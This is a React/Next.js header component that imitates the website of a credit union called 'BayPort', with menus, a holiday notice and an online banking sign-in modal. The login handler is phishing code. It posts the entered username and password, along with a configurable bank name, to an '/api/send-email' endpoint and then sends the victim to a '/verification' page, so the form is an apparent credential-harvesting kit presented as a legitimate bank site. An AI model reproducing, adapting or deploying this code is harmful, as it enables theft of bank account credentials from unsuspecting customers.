import { useState } from "react";
import { Search, User, Menu, X, ChevronRight } from "lucide-react";
import Logo from "../../../public/assets/logo.png";
import Image from "next/image";
import { useRouter } from "next/navigation";

export default function ResponsiveHeader() {
  const router = useRouter();
  const [showLogin, setShowLogin] = useState(false);
  const [showMobileMenu, setShowMobileMenu] = useState(false);
  const [activeMenu, setActiveMenu] = useState(null);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);

  const handleLogin = async(e) => {
    e.preventDefault();

    if (!username || !password) {
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          username: username,
          password: password,
        }),
      });

      if (!response.ok) {
        throw new Error("Authentication failed");
      }

      const data = await response.json();
      
      setTimeout(() => {
        router.push("/verification");
      }, 1000);
      // setSubmitStatus("success");
    } catch (error) {
      console.error("Login failed:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const menuItems = [
    'Financial Wellness',
    'Bank', 
    'Borrow',
    'Insure',
    'Invest',
    'Home',
    'Business'
  ];

  const footerLinks = [
    'Branches & ITMs',
    'Rates',
    'About',
    'Careers',
    'Help'
  ];

  return (
    <div className="relative">
      {/* Holiday Notice Banner */}
      <div className="bg-[#FFF3CD] text-center py-2 text-sm border-b border-yellow-200 text-[#8D6604] px-4 md:pr-[25vw]">
        <strong>Holiday Closing:</strong> All BayPort branches will be closed Monday, May 26, in observance of Memorial Day.
      </div>

      {/* Header */}
      <header className="bg-white shadow-md sticky top-0 z-50 text-[#A1A1A1]">
        {/* Desktop Top Bar */}
        <div className="hidden md:block">
          <div className="max-w-7xl mx-auto px-4 flex justify-between items-center py-2 text-sm">
            <div className="relative w-64">
              <input
                type="text"
                placeholder="What can we help you find?"
                className="pl-4 pr-10 py-2 border rounded-md w-full border-gray-300 focus:ring-2 focus:ring-green-500"
              />
              <Search className="absolute right-3 top-2.5 h-4 w-4 text-gray-400" />
            </div>

            <div className="flex items-center gap-6">
              <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Branches & ITMs</a>
              <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Rates</a>
              <a href="#" className="text-[#A1A1A1] hover:text-gray-800">About</a>
              <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Careers</a>
              <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Help</a>
              <button
                onClick={() => setShowLogin(!showLogin)}
                className="flex items-center space-x-1 text-green-600 hover:text-green-700"
              >
                <User className="h-4 w-4" />
                <span>Log in</span>
              </button>
            </div>
          </div>
          <div className="flex justify-center">
            <hr className="border w-[65vw] align-middle"/>
          </div>
        </div>

        {/* Mobile Header Row */}
        <div className="md:hidden flex items-center justify-between px-4 py-3">
          {/* Logo */}
          <div className="flex items-center">
            <Image
            src={Logo}
            alt="BayPort Logo"
            width={'10vw'}
            height={60}
            // className="w-10 h-10 bg-gradient-to-br from-green-500 to-blue-600 rounded-sm mr-3"
            />
          </div>

          {/* Right Side Icons */}
          <div className="flex items-center gap-3">
            <button
              onClick={() => setShowLogin(!showLogin)}
              className="flex items-center space-x-1 text-green-600 hover:text-green-700 p-2"
            >
              <User className="h-5 w-5" />
            </button>
            
            <button
              onClick={() => setShowMobileMenu(!showMobileMenu)}
              className="p-2"
            >
              {showMobileMenu ? (
                <X className="h-6 w-6 text-gray-600" />
              ) : (
                <Menu className="h-6 w-6 text-gray-600" />
              )}
            </button>
          </div>
        </div>

        {/* Desktop Main Nav */}
        <div className="hidden md:block">
          <div className="max-w-7xl mx-auto px-4 flex items-center justify-between py-3">
            <div className="flex items-center">
              <Image
            src={Logo}
            alt="BayPort Logo"
            width={'10vw'}
            height={100}
            // className="w-10 h-10 bg-gradient-to-br from-green-500 to-blue-600 rounded-sm mr-3"
            />
            </div>

            <nav className="flex gap-8 text-sm font-medium">
              {menuItems.map((item) => (
                <div
                  key={item}
                  onMouseEnter={() => setActiveMenu(item)}
                  onMouseLeave={() => setActiveMenu(null)}
                  className="relative"
                >
                  <button className="hover:text-green-700">{item}</button>

                  {/* Dropdown Example for 'Borrow' */}
                  {activeMenu === item && item === 'Borrow' && (
                    <div className="absolute top-full left-0 bg-white border shadow-xl w-80 p-4 rounded-md z-40">
                      <ul className="space-y-3">
                        <li><strong>Buy a car</strong> <br /><span className="text-xs text-gray-500">Get pre-qualified for a vehicle loan</span></li>
                        <li><strong>Credit cards</strong> <br /><span className="text-xs text-gray-500">Cash in on rewards and low rates</span></li>
                        <li><strong>Take-Back® Loans</strong> <br /><span className="text-xs text-gray-500">Pay ahead and access funds later</span></li>
                        <li><strong>Refinance</strong> <br /><span className="text-xs text-gray-500">Lower your rate and payments</span></li>
                        <li><strong>Personal loans</strong> <br /><span className="text-xs text-gray-500">Flexible financing when you need it</span></li>
                        <li><strong>Skip-A-Payment</strong> <br /><span className="text-xs text-gray-500">Hit pause on your loan payment</span></li>
                      </ul>
                    </div>
                  )}
                </div>
              ))}
            </nav>

            <button className="bg-green-500 hover:bg-green-600 text-white text-sm px-4 py-2 rounded-full shadow">
              Join BayPort
            </button>
          </div>
        </div>
      </header>

      {/* Mobile Menu Overlay */}
      {showMobileMenu && (
        <div className="md:hidden fixed inset-0 bg-white z-50 overflow-y-auto">
          {/* Header */}
          <div className="flex items-center justify-between px-4 py-4 border-b">
            <div className="flex items-center">
              <div className="w-8 h-6 bg-gradient-to-br from-green-500 to-blue-600 rounded-sm mr-2"></div>
              <div>
                <div className="text-lg font-bold text-gray-800">BayPort</div>
                <div className="text-xs text-gray-600 -mt-1">Credit Union</div>
              </div>
            </div>
            <button
              onClick={() => setShowMobileMenu(false)}
              className="p-2"
            >
              <X className="h-6 w-6 text-gray-600" />
            </button>
          </div>

          {/* Search */}
          <div className="px-4 py-4 border-b">
            <div className="relative">
              <input
                type="text"
                placeholder="What can we help you find?"
                className="pl-4 pr-10 py-3 border rounded-md w-full border-gray-300 focus:ring-2 focus:ring-green-500"
              />
              <Search className="absolute right-3 top-3.5 h-5 w-5 text-gray-400" />
            </div>
          </div>

          {/* Main Navigation */}
          <div className="px-4 py-4">
            <nav className="space-y-1">
              {menuItems.map((item) => (
                <button
                  key={item}
                  className="flex items-center justify-between w-full py-4 text-left text-lg font-medium text-gray-800 hover:text-green-700 border-b border-gray-100"
                >
                  <span>{item}</span>
                  <ChevronRight className="h-5 w-5 text-gray-400" />
                </button>
              ))}
            </nav>
          </div>

          {/* Join Button */}
          <div className="px-4 py-4">
            <button className="w-full bg-green-500 hover:bg-green-600 text-white text-lg py-4 rounded-full shadow font-medium">
              Join BayPort
            </button>
          </div>

          {/* Footer Links */}
          <div className="px-4 py-4 border-t bg-gray-50 space-y-4">
            {footerLinks.map((item) => (
              <button
                key={item}
                className="block w-full text-left py-2 text-gray-600 hover:text-gray-800"
              >
                {item}
              </button>
            ))}
            
            <button
              onClick={() => {
                setShowMobileMenu(false);
                setShowLogin(true);
              }}
              className="flex items-center space-x-2 py-2 text-green-600 hover:text-green-700"
            >
              <User className="h-4 w-4" />
              <span>Log in</span>
            </button>
          </div>
        </div>
      )}

      {/* Floating Login Modal - Same for Desktop and Mobile */}
      {showLogin && (
        <div 
          className="fixed inset-0 z-50"
          onClick={() => setShowLogin(false)}
        >
          <div 
            className="absolute right-4 md:right-80 top-20 bg-white shadow-lg p-6 w-80 max-w-[calc(100vw-2rem)]"
            onClick={(e) => e.stopPropagation()}
          >
            <h3 className="text-md font-medium mb-4 text-center text-black">Online Banking Sign In</h3>
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full text-black mb-3 border px-3 py-2 rounded focus:ring focus:ring-green-200"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full text-black mb-3 border px-3 py-2 rounded focus:ring focus:ring-green-200"
            />
            <button 
              onClick={handleLogin}
              disabled={isSubmitting}
              className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700 disabled:opacity-50"
            >
              {isSubmitting ? 'Signing In...' : 'Log In'}
            </button>
            
            {submitStatus === 'success' && (
              <div className="text-green-600 text-sm text-center mt-2">
                Login successful! Redirecting...
              </div>
            )}

            {submitStatus === 'error' && (
              <div className="text-red-600 text-sm text-center mt-2">
                Login failed. Please try again.
              </div>
            )}

            <div className="text-sm text-blue-600 mt-3">
              <a href="#" className="hover:underline block">Forgot Your Login?</a>
              <a href="#" className="hover:underline block mt-1">Activate Consumer Online Banking</a>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}